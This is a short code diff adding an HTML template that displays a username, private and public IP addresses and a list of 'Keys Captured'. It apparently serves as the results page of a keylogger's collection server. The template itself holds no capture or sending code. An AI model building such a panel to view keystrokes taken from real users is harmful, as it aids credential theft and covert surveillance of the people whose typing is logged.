@@ -1,0 +1,15 @@
+{% extends 'layout.html' %}
+{% block content %}
+  <h1 class="display-3">Username: {{date.user}}</h1>
+<hr class="my-4">
+<h1 class="display-3">Private IP: {{date.ip_privat}}</h1>
+<hr class="my-4">
+<h1 class="display-3">Public IP: {{ date.ip_public}}</h1>
+<hr class="my-4">
+<h1 class="display-3">Keys Captured:</h1>
+<hr class="my-4">
+<p>
+    {{date.loguri}}
+</p>
+
+{% endblock %}
